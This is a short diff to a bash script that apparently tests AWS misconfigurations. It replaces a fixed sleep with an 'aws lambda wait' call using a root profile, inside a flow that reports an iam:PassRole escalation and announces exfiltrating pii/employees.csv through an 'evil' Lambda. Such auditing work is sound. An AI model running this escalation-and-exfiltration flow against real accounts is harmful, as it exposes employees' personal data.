@@ -203,7 +203,9 @@ if echo "$CREATE" | grep -q "arn:aws:lambda"; then
     finding "iam:PassRole on Resource:* allowed deploying Lambda with overpermissive role"
 
     info "Waiting for Lambda to be active..."
-    sleep 3
+    aws lambda wait function-active \
+      --profile root \
+      --function-name "$EVIL_FUNC" 2>/dev/null || sleep 10
 
     info "Exfiltrating pii/employees.csv via evil Lambda..."
     aws lambda invoke \
